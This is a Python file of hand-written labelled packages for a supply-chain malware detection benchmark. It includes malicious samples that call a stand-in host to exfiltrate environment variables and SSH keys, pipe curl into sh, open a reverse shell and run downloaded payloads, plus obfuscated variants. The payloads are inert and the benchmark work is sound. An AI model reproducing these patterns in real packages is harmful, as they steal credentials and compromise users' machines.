"""Labelled synthetic packages for the detection benchmark.

Every sample is written for this benchmark. Malicious samples reproduce the *shape* of published
supply-chain techniques with inert content: hosts are ``*.example.invalid`` (a reserved name that
never resolves), encoded payloads decode to a harmless ``print`` call, and nothing here is ever
executed - the benchmark only feeds the text to Warden's static analyzers.

Benign samples are deliberately hard: they use the same modules and file types as the malicious
ones (a compiler call in ``setup.py``, an editable-install ``.pth``, base64 image data, network
code that runs only when called).

The corpus is small and hand-written, so the numbers it produces describe how Warden handles these
specific patterns - they are not an estimate of real-world detection rates.
"""

from __future__ import annotations

import base64
from dataclasses import dataclass, field

MALICIOUS = "malicious"
BENIGN = "benign"

_INERT = base64.b64encode(b"print('warden benchmark: inert payload')\n" * 8).decode()
_HOST = "collector.example.invalid"

ESTABLISHED = {
    "_age_days": 900,
    "_maintainer_count": 3,
    "project_urls": {"Source": "https://github.com/example-org/bench-pkg"},
    "home_page": "https://github.com/example-org/bench-pkg",
    "_releases_last_7d": 0,
    "_version_found": True,
}


@dataclass(frozen=True)
class Sample:
    id: str
    label: str
    technique: str
    files: dict[str, str]
    name: str = "bench-pkg"
    evasive: bool = False
    notes: str = ""
    # Registry facts an established package would have; samples override them where the technique
    # depends on them. Without these every sample would carry reputation findings real packages lack.
    metadata: dict = field(default_factory=lambda: dict(ESTABLISHED))


def _setup(body: str) -> str:
    return f"from setuptools import setup\n{body}\nsetup(name='bench-pkg', version='1.0.0')\n"


SAMPLES: list[Sample] = [
    # ------------------------------------------------------------------ malicious
    Sample("mal-install-network", MALICIOUS, "install_time_network", {
        "setup.py": _setup(f"import urllib.request\nurllib.request.urlopen('https://{_HOST}/i?h=1')"),
    }),
    Sample("mal-install-encoded-exec", MALICIOUS, "install_time_encoded_exec", {
        "setup.py": _setup(f"import base64\nexec(base64.b64decode('{_INERT}'))"),
    }),
    Sample("mal-env-exfil", MALICIOUS, "credential_harvest_exfil", {
        "bench_pkg/__init__.py": (
            "import os, json, urllib.request\n"
            "data = json.dumps(dict(os.environ)).encode()\n"
            f"urllib.request.urlopen('https://{_HOST}/c', data=data)\n"
        ),
    }),
    Sample("mal-ssh-key-theft", MALICIOUS, "credential_file_access", {
        "bench_pkg/__init__.py": (
            "import os, socket\n"
            "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
            f"s = socket.create_connection(('{_HOST}', 443)); s.sendall(key.encode())\n"
        ),
    }),
    Sample("mal-pth-hook", MALICIOUS, "pth_startup_hook", {
        "bench_pkg_init.pth": f"import base64; exec(base64.b64decode('{_INERT}'))\n",
    }),
    Sample("mal-in-tree-backend", MALICIOUS, "build_backend_hook", {
        "pyproject.toml": '[build-system]\nrequires = []\nbuild-backend = "backend"\nbackend-path = ["_b"]\n',
        "_b/backend.py": (
            "import subprocess\n"
            "def build_wheel(*a, **k):\n"
            f"    subprocess.run(['sh', '-c', 'curl -s https://{_HOST}/x | sh'])\n"
        ),
    }),
    Sample("mal-shadow-pip", MALICIOUS, "entrypoint_shadowing", {
        "bench_pkg.egg-info/entry_points.txt": "[console_scripts]\npip = bench_pkg.shim:main\n",
        "bench_pkg/shim.py": "import subprocess, sys\ndef main():\n    subprocess.call(['pip'] + sys.argv[1:])\n",
    }),
    Sample("mal-reverse-shell", MALICIOUS, "reverse_shell", {
        "bench_pkg/__init__.py": (
            "import socket, subprocess, os\n"
            f"s = socket.socket(); s.connect(('{_HOST}', 4444))\n"
            "os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1)\n"
            "subprocess.call(['/bin/sh', '-i'])\n"
        ),
    }),
    Sample("mal-download-execute", MALICIOUS, "download_and_execute", {
        "setup.py": _setup(
            "import os, urllib.request\n"
            f"urllib.request.urlretrieve('https://{_HOST}/payload.bin', '/tmp/p')\n"
            "os.chmod('/tmp/p', 0o755); os.system('/tmp/p')"
        ),
    }),
    Sample("mal-typosquat", MALICIOUS, "typosquatting", {
        "reqeusts/__init__.py": f"import urllib.request\nurllib.request.urlopen('https://{_HOST}/t')\n",
    }, name="reqeusts"),
    # Evasive variants: the same behaviour written to avoid simple pattern matching.
    Sample("eva-string-reconstruction", MALICIOUS, "install_time_encoded_exec", {
        "setup.py": _setup(
            "import base64\n"
            "fn = getattr(__builtins__, 'ex' + 'ec')\n"
            f"fn(base64.b64decode('{_INERT[:40]}' + '{_INERT[40:]}'))"
        ),
    }, evasive=True),
    Sample("eva-dynamic-import", MALICIOUS, "install_time_network", {
        "setup.py": _setup(
            "mod = __import__('urllib' + '.request', fromlist=['x'])\n"
            f"getattr(mod, 'url' + 'open')('https://{_HOST}/d')"
        ),
    }, evasive=True),
    Sample("eva-hex-payload", MALICIOUS, "install_time_encoded_exec", {
        "setup.py": _setup(f"exec(bytes.fromhex('{base64.b64decode(_INERT).hex()}').decode())"),
    }, evasive=True),
    Sample("eva-nested-module", MALICIOUS, "credential_harvest_exfil", {
        "bench_pkg/util/_internal/compat.py": (
            "import os as _o\nimport urllib.request as _u\n"
            "_e = {k: v for k, v in _o.environ.items() if 'KEY' in k or 'TOKEN' in k}\n"
            f"_u.urlopen('https://{_HOST}/e', data=repr(_e).encode())\n"
        ),
    }, evasive=True),
    # ------------------------------------------------------------------ benign
    Sample("ben-plain-library", BENIGN, "plain_library", {
        "setup.py": _setup(""),
        "bench_pkg/__init__.py": "def add(a, b):\n    return a + b\n",
    }),
    Sample("ben-native-build", BENIGN, "compiler_invocation", {
        "setup.py": _setup(
            "import subprocess, sys\n"
            "subprocess.check_call([sys.executable, '-c', 'import sysconfig'])"
        ),
    }),
    Sample("ben-editable-pth", BENIGN, "editable_install_pth", {
        "__editable__.bench_pkg-1.0.0.pth": "import __editable___bench_pkg_finder; "
                                            "__editable___bench_pkg_finder.install()\n",
    }),
    Sample("ben-http-client", BENIGN, "http_client_library", {
        "bench_pkg/client.py": (
            "import urllib.request, json\n"
            "def get_json(url, timeout=10):\n"
            "    with urllib.request.urlopen(url, timeout=timeout) as r:\n"
            "        return json.load(r)\n"
        ),
    }),
    Sample("ben-base64-assets", BENIGN, "embedded_assets", {
        "bench_pkg/icons.py": "import base64\nLOGO = base64.b64decode(\n    '" + base64.b64encode(
            b"\x89PNG\r\n\x1a\n" + bytes(range(256)) * 2).decode() + "'\n)\n",
    }),
    Sample("ben-cli-tool", BENIGN, "console_script", {
        "pyproject.toml": ('[build-system]\nrequires = ["hatchling"]\nbuild-backend = "hatchling.build"\n'
                           '[project]\nname = "bench-pkg"\n[project.scripts]\nbench-pkg = "bench_pkg.cli:main"\n'),
        "bench_pkg/cli.py": "import argparse\ndef main():\n    argparse.ArgumentParser().parse_args()\n",
    }),
    Sample("ben-config-from-env", BENIGN, "environment_config", {
        "bench_pkg/settings.py": (
            "import os\n"
            "DEBUG = os.environ.get('BENCH_DEBUG') == '1'\n"
            "API_URL = os.environ.get('BENCH_API_URL', 'https://api.example.invalid')\n"
        ),
    }),
    Sample("ben-test-fixtures", BENIGN, "test_fixture_subprocess", {
        "tests/test_cli.py": (
            "import subprocess, sys\n"
            "def test_help():\n"
            "    subprocess.run([sys.executable, '-m', 'bench_pkg', '--help'], check=True)\n"
        ),
    }),
]


def by_id(sample_id: str) -> Sample:
    for sample in SAMPLES:
        if sample.id == sample_id:
            return sample
    raise KeyError(sample_id)
